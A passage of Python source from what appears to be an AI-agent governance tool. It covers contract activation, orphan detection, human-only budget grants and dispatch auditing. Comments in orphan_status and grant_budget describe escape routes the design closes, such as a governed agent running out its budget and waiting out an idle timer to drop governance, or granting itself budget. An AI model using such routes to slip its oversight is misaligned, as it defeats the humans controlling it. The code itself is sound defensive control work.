    for slot, contract in _active_worker_contracts(workspace):
        lifecycle = contract.get("worker_lifecycle") or {}
        if lifecycle.get("stage") != stage or str(
                lifecycle.get("task") or "") != str(task or ""):
            continue
        receipt = lifecycle.get("terminal")
        if not isinstance(receipt, dict):
            receipt = record_worker_terminal(
                workspace, slot, event=None, outcome=outcome,
                submission_status=submission_status, now=now,
                authority="loop-gate")
        released.append(release_worker_contract(
            workspace, slot, action=lifecycle["release_action"],
            terminal_receipt=receipt))
    return released


def encode_worker_release_action(action: dict) -> str:
    return base64.urlsafe_b64encode(json.dumps(
        action, sort_keys=True, separators=(",", ":")
    ).encode("utf-8")).decode("ascii").rstrip("=")


def decode_worker_release_action(value: str) -> dict:
    try:
        raw = str(value or "")
        action = json.loads(base64.urlsafe_b64decode(
            raw + "=" * (-len(raw) % 4)).decode("utf-8"))
    except (ValueError, TypeError, UnicodeDecodeError) as exc:
        raise ValueError("signed worker release action is malformed") from exc
    if not isinstance(action, dict):
        raise ValueError("signed worker release action is malformed")
    return action


def task_slot() -> str | None:
    """The per-task contract slot selected by TASKPLANE_TASK, or None for the
    legacy single slot. An ill-formed value raises StateError (fail closed —
    it must never silently select the wrong contract)."""
    v = (os.environ.get("TASKPLANE_TASK") or "").strip()
    if not v:
        return None
    if not _TASK_SLOT_RE.match(v):
        raise StateError(
            "TASKPLANE_TASK", f"invalid task slot {v!r}",
            "use the task id from the dispatch brief "
            "([A-Za-z0-9][A-Za-z0-9._-]*, max 64 chars) or unset it")
    return v


def active_contract_path(workspace: str, slot: str | None = None) -> str:
    """Where this process's active contract lives. `slot` overrides the
    TASKPLANE_TASK resolution (for orchestrators managing several slots)."""
    slot = task_slot() if slot is None else slot
    if slot is None:
        return os.path.join(tp_dir(workspace), "active_contract.json")
    return os.path.join(tp_dir(workspace), "active", f"{slot}.json")


def _active_contract_path(workspace: str) -> str:
    return active_contract_path(workspace)


def _snapshot_path(workspace: str, slot: str | None = None) -> str:
    slot = task_slot() if slot is None else slot
    if slot is None:
        return os.path.join(tp_dir(workspace), "snapshot")
    return os.path.join(tp_dir(workspace), "active", f"{slot}.snapshot")


# Windows has no signal 0. `os.kill(pid, 0)` there does NOT probe liveness:
# CPython maps signal 0 to CTRL_C_EVENT and calls GenerateConsoleCtrlEvent,
# i.e. it SENDS Ctrl+C to the console process group. The consequences were
# both of the ones you would fear:
#
#   * liveness was never actually measured — a dead pid raises a generic
#     OSError (ERROR_INVALID_PARAMETER) rather than ProcessLookupError, which
#     the old handler read as "unknowable, assume alive", so an orphaned
#     contract was NEVER auto-released on Windows and the workspace stayed
#     governed by a process that no longer existed; and
#   * the probe interrupted whatever shared the console. This is what
#     truncated the Windows CI leg: the suite died with KeyboardInterrupt
#     partway through, reporting a partial result that looked like slowness.
#
# The supported probe is OpenProcess + GetExitCodeProcess. Kept as a separate
# function taking its kernel32 so the branch is unit-testable off Windows.
_STILL_ACTIVE = 259
_ERROR_ACCESS_DENIED = 5
_PROCESS_QUERY_LIMITED_INFORMATION = 0x1000


def _pid_alive_windows(pid: int, kernel32) -> bool:
    """Liveness via the Win32 API. Fails toward ALIVE (stay governed) on
    anything ambiguous — access denied means the process exists but belongs
    to another user, which is emphatically not 'orphaned'."""
    handle = kernel32.OpenProcess(_PROCESS_QUERY_LIMITED_INFORMATION,
                                  False, int(pid))
    if not handle:
        return kernel32.GetLastError() == _ERROR_ACCESS_DENIED
    try:
        import ctypes
        code = ctypes.c_ulong()
        if not kernel32.GetExitCodeProcess(handle, ctypes.byref(code)):
            return True          # unknowable -> governed
        return code.value == _STILL_ACTIVE
    finally:
        kernel32.CloseHandle(handle)


def _pid_alive(pid: int) -> bool:
    if sys.platform == "win32":                      # pragma: no cover - win
        try:
            import ctypes
            return _pid_alive_windows(pid, ctypes.windll.kernel32)
        except Exception:
            return True          # unknowable -> stay governed
    try:
        os.kill(int(pid), 0)
    except ProcessLookupError:
        return False
    except (PermissionError, OverflowError):
        return True   # exists (or unknowable) — treat as alive, stay governed
    except (ValueError, OSError):
        return True
    return True


def orphan_status(workspace: str, contract: dict,
                  now: float | None = None, *,
                  settings_authority: dict | None = None) -> tuple[bool, str]:
    """Is the active contract ORPHANED — its owner gone, nobody to clear it?

    Two guards, in order (v0.9.6):

    1. PID, when recorded (TASKPLANE_AGENT_PID), is authoritative:
         * ALIVE -> NOT orphaned, NEVER idle-released.
         * DEAD  -> orphaned (owner really is gone).

    2. NO PID recorded — the COMMON case, since most activators don't export
       a PID, so relying on it alone would degrade to pure-TTL (the v0.9.5
       hole). So the WALL is enforced by EXHAUSTION, not PID:
         * budget-EXHAUSTED (used >= max_actions) -> a HUMAN GATE, NEVER
           idle-released. This is what stops a live agent from exhausting its
           budget and waiting out the TTL to shed the wall, and stops a long
           human gate from silently dropping governance. Only the human
           clears/grants it, from OUTSIDE the workspace.
         * NOT exhausted -> idle backstop for an agent that CRASHED mid-work,
           measured from the last time it was SEEN screening (any call — a
           working agent keeps generating approvals; a dead one makes none).
           Fires after the TTL (contract `orphan_ttl_seconds`, env
           TASKPLANE_ORPHAN_TTL, default DEFAULT_ORPHAN_TTL).

    The screener auto-clears an orphaned contract and abstains."""
    import time
    now = time.time() if now is None else now
    if contract.get("_union"):
        # A union of parallel contracts is NEVER auto-released: the screener's
        # clear() would touch only the legacy slot, so "releasing" it would
        # just drop governance for this action while the member slots stay
        # active — an escape hatch, not a cleanup. Members orphan-release
        # individually through their own TASKPLANE_TASK-scoped screeners; a
        # human clears stale slots with TASKPLANE_TASK=<slot> tp.py clear.
        return False, ("union of active per-task contracts — never "
                       "auto-released; clear individual slots")
    submission_contract = contract.get("submission_contract")
    if isinstance(submission_contract, dict) and \
            submission_contract.get("required") is True:
        # A required handoff is an orchestrator/human authority boundary.
        # Even a dead worker or expired idle timer does not prove that its
        # evidence is valid, nor authorize this host lifecycle hook to erase
        # the contract before the orchestrator evaluates it.
        return False, ("submission-required contract — never auto-released; "
                       "orchestrator/human releases it after the gate")
    pid = contract.get("activated_pid")
    if pid is not None:
        # PID is the AUTHORITATIVE liveness signal. A live owner is NEVER
        # released by idle — otherwise a governed agent could simply wait out
        # a TTL to shed the wall, and a live-but-paused run (a long human
        # gate, a `sleep`) would silently lose governance. Dead owner =>
        # genuinely orphaned => release.
        if _pid_alive(pid):
            return False, f"owner pid {pid} alive — governed"
        return True, f"activating process {pid} is dead"

    # No recorded PID: liveness is unprovable (TASKPLANE_AGENT_PID is rarely
    # exported, so this is the COMMON path). Read the meter for the action
    # count and the last time the owner was SEEN screening (any call — approve
    # or deny — proves the agent is alive; only a truly dead owner makes no
    # calls at all).
    tid = contract.get("task_id", "_")
    used, last_seen = 0, 0.0
    try:
        with open(os.path.join(tp_dir(workspace), "meter.json"), encoding="utf-8") as f:
            e = (json.load(f).get(tid) or {})
        used = int(e.get("actions", 0))
        last_seen = float(e.get("last_seen_ts")
                          or e.get("last_action_ts") or 0)
    except (OSError, ValueError, TypeError):
        pass

    # THE WALL (v0.9.6 fix): a budget-EXHAUSTED contract is a HUMAN GATE, not
    # an idle-orphan — NEVER auto-released. Otherwise a live governed agent
    # could exhaust its budget and simply wait out the TTL to shed the wall
    # (the exact escape the design forbids), and any human gate/sleep past the
    # TTL would silently drop governance. An exhausted contract is released
    # only by the human, from OUTSIDE the workspace: `tp.py clear --workspace`
    # / `tp.py budget --grant`. (The v0.9.5 model tried to distinguish live
    # from dead via a no-deny clock, but nothing populates the owner PID, so
    # it degraded to pure-TTL and the exploit was live. Gating on exhaustion
    # closes it without depending on a PID no caller sets.)
    max_a = (contract.get("budget") or {}).get("max_actions")
    # `is not None`, not truthiness: a ZERO-action ceiling (max_actions=0) is
    # exhausted from the first call and must be a human gate too — never
    # idle-released (v2.3.0).
    if max_a is not None and used >= int(max_a):
        return False, ("budget-exhausted — human gate, never idle-released "
                       "(clear/grant from outside the workspace)")

    # A READ-ONLY review/plan contract is NEVER idle-released. It cannot damage
    # the tree (writes are already blocked), so an idle release buys nothing —
    # its only effect is to DROP governance on a long-but-live review (a human
    # gate over lunch, a long build, a sleep) and let the next action write the
    # reviewed source ungoverned. Treat idle as a human-gated quarantine:
    # release a read-only contract only on a proven-dead PID (handled above),
    # never on the TTL. (The idle backstop below is for WRITE contracts, whose
    # leak actually costs something.)
    if contract.get("read_only"):
        return False, ("read-only review contract — never idle-released "
                       "(a long live review keeps governance; clear from "
                       "outside the workspace if it is truly orphaned)")

    # Non-exhausted, no PID: the idle backstop for a WRITE agent that CRASHED
    # mid-work. A working agent keeps generating approved actions (refreshing
    # last_seen); one that died makes no calls, so its clock goes stale and
    # the contract releases — recovering a genuine leak WITHOUT ever releasing
    # a live, on-budget, actively-screening agent.
    settings = _canonical_operational_settings(
        legacy_environment=True, authority=settings_authority)
    ttl = float(contract["orphan_ttl_seconds"]
                if "orphan_ttl_seconds" in contract
                else settings.runtime.orphan_ttl_seconds)
    if ttl <= 0:
        return False, "orphan TTL disabled"
    last = max(float(contract.get("activated_at") or 0), last_seen)
    if last and (now - last) > ttl:
        idle = int(now - last)
        return True, (f"no activity for {idle}s (> {int(ttl)}s TTL), "
                      "owner gone (not budget-exhausted)")
    return False, "within idle TTL / recently active"


def grant_budget(workspace: str, extra: int) -> dict | None:
    """Raise the active contract's action ceiling by `extra` — the approval
    half of the budget gate. Returns the updated contract, or None if there is
    no active contract / no ceiling to raise.

    This is a HUMAN action, run from an UNGOVERNED context. There is NO
    screener exemption (the wall is intentional — a governed agent must not
    grant itself budget): a `tp.py budget --grant` issued with cwd INSIDE
    the exhausted workspace is itself screened and blocked. The human runs it
    from a different directory (the hook keys governance on cwd), passing
    `--workspace <ws>`."""
    c = load_active(workspace)
    if c is None:
        return None
    if c.get("_union"):
        # A grant must land on ONE task's contract file — writing the
        # synthetic union to the legacy slot would mint a phantom contract.
        raise StateError(
            _active_contract_path(workspace),
            "several per-task contracts are active — a blanket grant is "
            "ambiguous",
            "re-run with TASKPLANE_TASK=<task_id> to grant that task's "
            "budget (see .taskplane/active/ for the slots)")
    b = c.setdefault("budget", {})
    old = b.get("max_actions")
    if old is None:
        return None   # unmetered contract — nothing to grant against
    # `is None`, not truthiness: a ZERO-action ceiling is grantable — that's
    # exactly the human-gate unblock path for --max-actions 0 (v2.3.0).
    b["max_actions"] = int(old) + int(extra)
    # Atomic write: a live screener may load_active concurrently; a torn read
    # of the contract fails CLOSED (block), so the grant meant to UNBLOCK
    # could momentarily hard-block.
    atomic_write_json(_active_contract_path(workspace), c, indent=2)
    trace(workspace, "budget_granted", extra=int(extra), old=int(old),
          new=b["max_actions"], task_id=c.get("task_id"))
    return c


def git_head(workspace: str) -> str | None:
    r = _run(["git", "rev-parse", "HEAD"], cwd=workspace)
    return r.stdout.strip() or None


def activate(workspace: str, contract: dict,
             snapshot: str | None = "auto", *,
             task_slot_override: str | None = None) -> dict:
    """Write the active contract + snapshot so the PreToolUse hook enforces
    it. Returns the contract. snapshot='auto' records git HEAD."""
    # This shared entry boundary covers CLI, loop, claim, and review adapters.
    import collision
    apply_foreign_state_exclusions(
        contract, workspace,
        allow_roots=((contract.get("foreign_state_override") or {}).get(
            "roots") or []),
        actor=(contract.get("foreign_state_override") or {}).get("actor"))
    roots = ((contract.get("foreign_state") or {}).get("detected") or [])
    if roots:
        collision.persist(workspace, roots=roots,
                          run_id=contract.get("task_id"))
    if snapshot == "auto":
        snapshot = git_head(workspace)
    # Orphan-release bookkeeping (see orphan_status): WHEN it was activated,
    # and — only if the activator exported a meaningful long-lived PID via
    # TASKPLANE_AGENT_PID — WHO. The CLI's own PID is transient (dead the
    # moment `tp new` exits) and would auto-release instantly, so it is
    # deliberately never recorded.
    import time
    contract.setdefault("activated_at", time.time())
    agent_pid = os.environ.get("TASKPLANE_AGENT_PID")
    # Reject pid <= 0: os.kill(0, 0) signals the whole PROCESS GROUP and
    # os.kill(-N, 0) a group too, so _pid_alive would report such a "pid"
    # alive forever and the contract would never idle-release. Only a real
    # positive pid is a usable liveness token.
    if agent_pid and str(agent_pid).isdigit() and int(agent_pid) > 0:
        contract.setdefault("activated_pid", int(agent_pid))
    d = tp_dir(workspace)
    os.makedirs(d, exist_ok=True)
    _ensure_self_ignored(d)
    # Opportunistic GC of taskplane's OWN stale artifacts (rename-tombstones
    # from safe_remove on unlink-refusing FUSE mounts, orphaned atomic-write
    # temps, stale locks) — bounded, best-effort, at a moment the workspace
    # is provably being reused. Never touches user data.
    _gc_runtime_artifacts(d)
    _gc_runtime_artifacts(os.path.join(d, "active"))
    selected_slot = task_slot() if task_slot_override is None \
        else str(task_slot_override)
    if selected_slot is not None and not _TASK_SLOT_RE.fullmatch(selected_slot):
        raise StateError("TASKPLANE_TASK",
                         f"invalid task slot {selected_slot!r}")
    cpath = active_contract_path(workspace, selected_slot)
    os.makedirs(os.path.dirname(cpath), exist_ok=True)
    atomic_write_json(cpath, contract, indent=2)
    spath = _snapshot_path(workspace, selected_slot)
    tmp = spath + f".tmp.{os.getpid()}"
    with open(tmp, "w", encoding="utf-8", newline="") as f:
        f.write(snapshot or "")
    os.replace(tmp, spath)
    projection = contract_projection(contract)
    trace(workspace, "contract_activated", task_id=contract.get("task_id"),
          task=contract.get("task"), read_only=bool(contract.get("read_only")),
          scope=projection["scope_paths"],
          write_allow=contract.get("write_allow"), snapshot=snapshot,
          slot=selected_slot)
    return contract


def safe_remove(path: str) -> None:
    """Remove a state file even on filesystems that forbid unlink (FUSE
    mounts in sandboxed/Cowork hosts allow rename but not delete). Falls
    back to an atomic rename-to-tombstone, so the original path is gone —
    the only property callers rely on — either way."""
    try:
        os.remove(path)
        return
    except FileNotFoundError:
        return
    except OSError:
        pass
    last: OSError | None = None
    for i in range(32):
        tomb = f"{path}.removed.{os.getpid()}.{i}"
        if os.path.exists(tomb):
            continue
        try:
            os.replace(path, tomb)          # rename IS allowed on these mounts
            return
        except OSError as e:                # pragma: no cover — rare double-fail
            last = e
    raise last or OSError("safe_remove: could not remove or rename")


_TOMBSTONE_RE = re.compile(r"\.removed\.\d+\.\d+$")
_TMPFILE_RE = re.compile(r"\.tmp\.\d+$")
_GC_AGE_S = 24 * 3600


def _gc_runtime_artifacts(d: str, now: float | None = None) -> int:
    """Best-effort sweep of taskplane's OWN stale artifacts in the runtime
    dir: safe_remove rename-tombstones (`*.removed.<pid>.<i>`), orphaned
    atomic-write temps (`*.tmp.<pid>`), lock files (`*.lock`) untouched for
    24h, and stale mkdir-fallback lock dirs (`*.lockdir`). ONLY entries
    matching those exact taskplane-minted patterns are ever deleted — never
    user data, never governance records (contracts, trace, meter, queues),
    never live locks (file_lock re-touches its lock file on every acquire,
    so a 24h-old mtime means 24h without an acquisition), never fresh
    temps. Returns the count removed."""
    now = _time.time() if now is None else now
    removed = 0
    try:
        names = os.listdir(d)
    except OSError:
        return 0
    for name in names:
        p = os.path.join(d, name)
        if name.endswith(".lockdir"):
            try:    # mkdir-fallback lock dir: rmdir only, only when stale
                if os.path.isdir(p) \
                        and now - os.stat(p).st_mtime > _GC_AGE_S:
                    os.rmdir(p)
                    removed += 1
            except OSError:
                pass
            continue
        stale_lock = name.endswith(".lock")
        if not (stale_lock or _TOMBSTONE_RE.search(name)
                or _TMPFILE_RE.search(name)):
            continue
        try:
            if not os.path.isfile(p):
                continue
            if now - os.stat(p).st_mtime <= _GC_AGE_S:
                continue
            os.unlink(p)
            removed += 1
        except OSError:
            continue
    return removed


def gc_runtime(workspace: str, now: float | None = None) -> dict:
    """`tp gc`-callable lifecycle sweep (v2.3.0). Prunes ONLY taskplane's
    runtime artifacts — FUSE rename-tombstones, orphaned atomic-write temps,
    stale lock files/dirs — from .taskplane/ and .taskplane/active/, at the
    conservative 24h age threshold `_gc_runtime_artifacts` enforces.
    NEVER touches governance records: contracts, snapshots, trace.jsonl
    (bounded separately by rotation), meter.json, dispatch queues, or
    anything in the knowledge store. Returns {"removed": n, "dir": path}."""
    d = tp_dir(workspace)
    removed = _gc_runtime_artifacts(d, now)
    removed += _gc_runtime_artifacts(os.path.join(d, "active"), now)
    return {"removed": removed, "dir": d}


def clear(workspace: str) -> None:
    """Release THIS process's contract slot only. With TASKPLANE_TASK set the
    per-task slot is removed; a sibling task's contract is never touched (the
    v2.3.0 fix: one agent's clear used to release everyone's contract)."""
    path = _active_contract_path(workspace)
    if os.path.exists(path):
        try:
            c = load_json(path, default={}, what="active contract")
        except StateError:
            c = {}                 # corrupt slot: still clearable
        if not isinstance(c, dict):
            c = {}
        safe_remove(path)
        slot = task_slot()
        if slot is not None:
            try:
                safe_remove(_snapshot_path(workspace))
            except OSError:
                pass
        trace(workspace, "contract_cleared", task_id=c.get("task_id"),
              slot=slot)


def snapshot_ref(workspace: str, *, task_slot_override: str | None = None) \
        -> str | None:
    """Read this process's snapshot, or one exact orchestrator-owned slot.

    ``task_slot_override`` is a control-plane address only. It does not set
    ``TASKPLANE_TASK`` and therefore cannot make a child contract govern the
    caller.
    """
    if task_slot_override is not None and not _TASK_SLOT_RE.fullmatch(
            str(task_slot_override)):
        raise StateError("TASKPLANE_TASK",
                         f"invalid task slot {task_slot_override!r}")
    p = _snapshot_path(workspace, task_slot_override)
    if os.path.exists(p):
        with open(p, encoding="utf-8") as f:
            return f.read().strip() or None
    return None


# --------------------------------------------------------------- state

def _ensure_self_ignored(d: str) -> None:
    """The runtime dir ignores itself — a worker's `git add -A` must never
    commit contracts/traces, and merges must never collide on them."""
    gi = os.path.join(d, ".gitignore")
    if not os.path.isdir(d):
        return
    body = ""
    try:
        with open(gi, encoding="utf-8") as f:
            body = f.read()
    except OSError:
        body = ""
    # Content check, not existence: a cloned repo can pre-plant a permissive
    # .gitignore here (e.g. "!trace.jsonl") to make the trace committable.
    if "*" not in body.splitlines():
        try:
            with open(gi, "w", encoding="utf-8", newline="") as f:
                f.write("*\n")
        except OSError:
            pass


# ------------------------------------------------ model capability tiers
#
# taskplane pins NO model in an agent's frontmatter — agents stay
# `model: inherit` so the plugin is portable across runtimes (the sibling
# orchestrator's hardcoded `model: sonnet` is exactly why its agents fail to
# spawn on a host that names models differently). Instead a loop STEP, a
# planned TASK, or a review LENS carries an ABSTRACT capability tier, and the
# loop DRIVER resolves it to a concrete model at dispatch time (the Agent
# tool's `model` param). Match model power to task difficulty: mechanical work
# runs on a cheaper/faster model, hard reasoning on a stronger one. Lower
# cost/latency is the natural benefit of capability-tiering — it is NOT a
# pricing feature and carries no pricing data (kb-lint still forbids that).
MODEL_TIERS = ("cheap", "standard", "deep")
REASONING_EFFORTS = ("low", "medium", "high", "xhigh", "max", "ultra")

# Legacy tiers are projections only. Their values come from stage settings;
# legacy environment aliases are interpreted by the typed loader for one
# compatibility release and never become another default authority.
def _default_tier_models() -> dict:
    """Compatibility tier projection of the canonical stage settings."""
    settings = _canonical_operational_settings(legacy_environment=True)
    return {"cheap": settings.stages["evaluate"].model,
            "standard": settings.stages["build"].model,
            "deep": settings.stages["design"].model}


def reasoning_for_tier(tier: str | None) -> str:
    """Resolve a capability tier to Codex's native reasoning effort.

    Unlike model ids, reasoning effort is provider-neutral metadata: every
    emitted brief carries it, while only Codex's native subagent dispatch
    consumes it. Invalid overrides fall back to the tier default instead of
    injecting an unsupported value into a host tool call.
    """
    t = (tier or "standard").strip().lower()
    settings = _canonical_operational_settings(legacy_environment=True)
    stage = {"cheap": "evaluate", "standard": "build", "deep": "design"}.get(
        t, "build")
    return settings.stages[stage].reasoning


def dispatch_task_name(kind: str, agent: str, ref: str | None = None) -> str:
    """Stable Codex task identity (lowercase letters/digits/underscores).

    The human-facing taskplane role remains separate in ``agent``. Keeping
    both fields prevents a generic Codex worker name from erasing who owns
    the contract while still satisfying Codex's task-name grammar.
    """
    role = (agent or "agent").removeprefix("tp-")
    parts = ["tp", kind]
    if role != kind:
        parts.append(role)
    if ref:
        parts.append(str(ref))
    identity = "\0".join((str(kind), str(agent), str(ref or "")))
    raw = "_".join(parts).lower()
    name = re.sub(r"[^a-z0-9]+", "_", raw).strip("_") or "tp_agent"
    digest = hashlib.sha1(identity.encode("utf-8")).hexdigest()[:8]
    return name[:55].rstrip("_") + "_" + digest


def role_marker(agent: str) -> str:
    """Exact marker native Codex messages bind to a taskplane role."""
    return "taskplane-role:" + str(agent)


def dispatch_fields(kind: str, agent: str, ref: str,
                    model_tier: str, *, capability_snapshot=None,
                    enforcement_mode: str | None = None,
                    observed_route: dict | None = None) -> dict:
    """Host-neutral dispatch identity carried by every Codex task brief."""
    role_path = os.path.abspath(os.path.join(
        os.path.dirname(__file__), "..", "agents", agent + ".md"))
    settings = _canonical_operational_settings(legacy_environment=True)
    stage = {
        "tp-product": "product", "tp-designer": "design",
        "tp-planner": "plan", "tp-executor": "build",
        "tp-evaluator": "evaluate", "tp-fixer": "fix",
        "tp-engineering": "evaluate",
    }.get(agent)
    if stage is None:
        requested_model = model_for_tier(model_tier)
        requested_effort = reasoning_for_tier(model_tier)
    else:
        requested_model = settings.stages[stage].model
        requested_effort = settings.stages[stage].reasoning
    route = None
    if capability_snapshot is not None:
        import host_capabilities

        route = host_capabilities.resolve_dispatch_route(
            capability_snapshot, tier=model_tier,
            requested_model=requested_model,
            requested_effort=requested_effort,
            mode=enforcement_mode or os.environ.get(
                "TASKPLANE_ENFORCE_DISPATCH", "default"),
            observed=observed_route)
    fields = {
        "role": agent,
        "role_marker": role_marker(agent),
        "role_instructions": to_posix(role_path),
        "task_name": dispatch_task_name(kind, agent, ref),
        "model_tier": model_tier,
        "model": (route["effective_model"] if route is not None
                  else requested_model),
        "reasoning_effort": (route["effective_effort"] if route is not None
                             else requested_effort),
        "settings_digest": settings.digest,
    }
    if route is not None:
        fields["dispatch_route"] = route
        fields["dispatch_blocked"] = route["block_before_dispatch"]
    return fields


# --- dispatch verification (tier routing is only real if the driver passes
# the emitted model to the Agent tool; these queues make that checkable) ---

def _dispatch_path(workspace: str, name: str) -> str:
    return os.path.join(tp_dir(workspace), name)


# _file_lock kept as the historical name; it is the shared file_lock (v2.3.0)
# — which never silently degrades to lock-free (mkdir fallback + StateError).
_file_lock = file_lock


def _load_queue(path: str) -> list:
    try:
        with open(path, encoding="utf-8") as f:
            q = json.load(f)
        return q if isinstance(q, list) else []
    except (OSError, ValueError):
        return []


def _load_queue_strict(path: str) -> list:
    """Dispatch audit state for enforcement; corruption never means empty."""
    if not os.path.exists(path):
        return []
    q = load_json(path, what="dispatch expectation queue")
    if not isinstance(q, list):
        raise StateError(path, "dispatch expectation queue is not a list")
    return q


# Dispatch-audit queues are BOUNDED at this many entries (a size/GC trade —
# a 26-lens wave emits 20+ briefs, multiple waves exceed any small cap).
# Entries beyond the cap are dropped oldest-first but ALWAYS COUNTED in the
# <queue>.dropped sidecar, so the audit names what it lost instead of
# silently undercounting unobserved/mismatched dispatches (v2.3.0).
_QUEUE_CAP = 200


def _queue_dropped(path: str) -> int:
    """Cumulative dropped-entry count for a queue (0 when never truncated).
    Corrupt sidecar -> StateError (audit state is never silently guessed)."""
    d = load_json(path + ".dropped", default={"dropped": 0},
                  what="dispatch-audit drop counter")
    try:
        return int((d or {}).get("dropped", 0))
    except (TypeError, ValueError):
        raise StateError(path + ".dropped",
                         "corrupt dispatch-audit drop counter")


def _save_queue(path: str, q: list) -> None:
    dropped = max(0, len(q) - _QUEUE_CAP)
    if dropped:
        atomic_write_json(path + ".dropped",
                          {"dropped": _queue_dropped(path) + dropped})
    tmp = f"{path}.tmp.{os.getpid()}"
    with open(tmp, "w", encoding="utf-8", newline="") as f:
        json.dump(q[-_QUEUE_CAP:], f, indent=1)
    os.replace(tmp, path)


def record_expected_dispatch(workspace: str, kind: str, agent: str,
                             model_tier: str, model: str | None,
                             ref: str | None = None,
                             task_name: str | None = None,
                             reasoning_effort: str | None = None,
                             role_marker_value: str | None = None,
                             dispatch_route: dict | None = None,
                             intent_id: str | None = None) -> None:
    """Called when a brief is emitted (`loop next` / `lens dispatch`): what
    agent SHOULD be dispatched next, on what model. A queue, not a scalar —
    a parallel wave emits many briefs with different tiers at once."""
    path = _dispatch_path(workspace, "expected_dispatch.json")
    with _file_lock(path):
        q = _load_queue_strict(path)
        entry = {"ts": _now(), "kind": kind, "agent": agent, "ref": ref,
                 "task_name": task_name or dispatch_task_name(
                     kind, agent, ref),
                 "role_marker": role_marker_value or role_marker(agent),
                 "model_tier": model_tier, "model": model,
                 "reasoning_effort": reasoning_effort or
                 reasoning_for_tier(model_tier), "matched": False}
        if intent_id is not None:
            entry["intent_id"] = intent_id
        if isinstance(dispatch_route, dict):
            entry["dispatch_route"] = dispatch_route
        # Emission is observational and may be repeated (refreshing a wave,
        # reopening a brief). Keep one pending expectation per native
        # identity and refresh its routing fields instead of manufacturing a
        # stale duplicate that can block an unrelated later spawn.
        for prior in q:
            same_identity = all(prior.get(k) == entry.get(k)
                                for k in ("kind", "task_name", "agent", "ref"))
            if same_identity and not prior.get("matched"):
                prior.update(entry)
                _save_queue(path, q)
                return
        q.append(entry)
        _save_queue(path, q)


def consume_expectation(workspace: str, agent: str,
                        strict: bool = False) -> dict | None:
    """Oldest unmatched expectation for a role or Codex task name."""
    short = (agent or "").split(":")[-1]
    path = _dispatch_path(workspace, "expected_dispatch.json")
    with _file_lock(path):
        q = _load_queue_strict(path) if strict else _load_queue(path)
        for e in q:
            if not e.get("matched") and short in (
                    e.get("agent"), e.get("task_name")):
                e["matched"] = True
                _save_queue(path, q)
                return e
    return None


def peek_expectation(workspace: str, agent: str | None = None,
                     strict: bool = False) -> dict | None:
    """Read, but do not consume, a matching (or oldest) expectation."""
    short = (agent or "").split(":")[-1]
    path = _dispatch_path(workspace, "expected_dispatch.json")
    with _file_lock(path):
        q = _load_queue_strict(path) if strict else _load_queue(path)
        for e in q:
            matches = not agent or short in (e.get("agent"),
                                              e.get("task_name"))
            if not e.get("matched") and matches:
                return dict(e)
    return None


def mark_expectation(workspace: str, expected: dict,
                     strict: bool = False) -> bool:
    """Consume the exact expectation after strict native fields validate."""
    path = _dispatch_path(workspace, "expected_dispatch.json")
    with _file_lock(path):
        q = _load_queue_strict(path) if strict else _load_queue(path)
        for e in q:
            same = all(e.get(k) == expected.get(k)
                       for k in ("ts", "task_name", "agent", "ref"))
            if same and not e.get("matched"):
                e["matched"] = True
                _save_queue(path, q)
                return True
    return False


def record_observed_dispatch(workspace: str, agent: str, model: str | None,
                             expected: dict | None, ok: bool,
                             reasoning_effort: str | None = None) -> None:
    path = _dispatch_path(workspace, "observed_dispatch.json")
    with _file_lock(path):
        q = _load_queue_strict(path)
        q.append({"ts": _now(), "agent": (agent or "").split(":")[-1],
                  "model": model, "reasoning_effort": reasoning_effort,
                  "ok": ok,
                  "expected_model": expected and expected.get("model"),
                  "expected_reasoning_effort": expected and expected.get(
                      "reasoning_effort"),
                  "expected_tier": expected and expected.get("model_tier"),
                  "ref": expected and expected.get("ref"),
                  "route_resolution": ((expected or {}).get(
                      "dispatch_route") or {}).get("resolution"),
                  "capability_source": ((expected or {}).get(
                      "dispatch_route") or {}).get("capability_source"),
                  "exact_route_verified": bool(ok and expected and
                      (((expected.get("model") is None) or
                        expected.get("model") == model) and
                       ((expected.get("reasoning_effort") is None) or
                        expected.get("reasoning_effort") == reasoning_effort)))})
        _save_queue(path, q)


def commit_dispatch_verification(workspace: str, agent: str,
                                 model: str | None,
                                 expected: dict | None, ok: bool,
                                 reasoning_effort: str | None = None,
                                 strict: bool = False) -> bool:
    """Audit a dispatch, then consume its expectation as one ordered commit.

    The expectation is saved *after* the observation. Any parse, lock, or
    audit-write failure therefore leaves it pending and retryable; strict
    callers can deny without silently losing the brief they must retry.
    """
    exp_path = _dispatch_path(workspace, "expected_dispatch.json")
    obs_path = _dispatch_path(workspace, "observed_dispatch.json")
    with _file_lock(exp_path):
        exp_q = (_load_queue_strict(exp_path) if strict
                 else _load_queue(exp_path))
        match = None
        if ok and expected is not None:
            for row in exp_q:
                same = all(row.get(k) == expected.get(k)
                           for k in ("ts", "task_name", "agent", "ref"))
                if same and not row.get("matched"):
                    match = row
                    break
            ok = match is not None
        with _file_lock(obs_path):
            obs_q = (_load_queue_strict(obs_path) if strict
                     else _load_queue(obs_path))
            obs_q.append({
                "ts": _now(), "agent": (agent or "").split(":")[-1],
                "model": model, "reasoning_effort": reasoning_effort,
                "ok": bool(ok),
                "expected_model": expected and expected.get("model"),
                "expected_reasoning_effort": expected and expected.get(
                    "reasoning_effort"),
                "expected_tier": expected and expected.get("model_tier"),
                "ref": expected and expected.get("ref"),
                "route_resolution": ((expected or {}).get(
                    "dispatch_route") or {}).get("resolution"),
                "capability_source": ((expected or {}).get(
                    "dispatch_route") or {}).get("capability_source"),
                "exact_route_verified": bool(ok and expected and
                    (((expected.get("model") is None) or
                      expected.get("model") == model) and
                     ((expected.get("reasoning_effort") is None) or
                      expected.get("reasoning_effort") == reasoning_effort))),
            })
            _save_queue(obs_path, obs_q)
        if ok and match is not None:
            match["matched"] = True
            _save_queue(exp_path, exp_q)
        return bool(ok)


def dispatch_report(workspace: str) -> dict:
    """Audit: per emitted brief, did a dispatch with the right model land?
    This is the by-hand trace.jsonl analysis, mechanized."""
    exp_path = _dispatch_path(workspace, "expected_dispatch.json")
    obs_path = _dispatch_path(workspace, "observed_dispatch.json")
    exp = _load_queue(exp_path)
    obs = _load_queue(obs_path)
    mismatches = [o for o in obs if not o.get("ok")]
    unobserved = [e for e in exp if not e.get("matched")]
    exp_dropped = _queue_dropped(exp_path)
    obs_dropped = _queue_dropped(obs_path)
    truncated = bool(exp_dropped or obs_dropped
                     or len(exp) >= _QUEUE_CAP or len(obs) >= _QUEUE_CAP)
    rep = {"expected": len(exp), "observed": len(obs),
           "mismatches": mismatches, "unobserved": len(unobserved),
           "hook_active": bool(obs),
           "expected_dropped": exp_dropped,
